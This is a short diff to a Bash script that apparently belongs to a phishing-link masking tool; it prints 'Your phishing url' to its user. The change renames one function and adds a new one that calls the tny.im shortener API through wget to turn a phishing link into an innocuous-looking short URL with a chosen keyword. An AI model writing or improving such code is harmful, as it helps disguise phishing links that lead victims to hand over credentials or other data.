@@ -254,7 +254,7 @@ echo -e "\e[1;96m===============================================================
 
 banner
 echo 
-ash() {
+ash1() {
 	sleep 0.5
 	url_checker() {
 	if [ ! "${1//:*}" = http ]; then
@@ -285,6 +285,10 @@ ash() {
         echo -e "\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Your phishing url >>\e[m $final "
 	echo
         }
+
+ash() {        
+        echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2`
+}
 
         read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 	
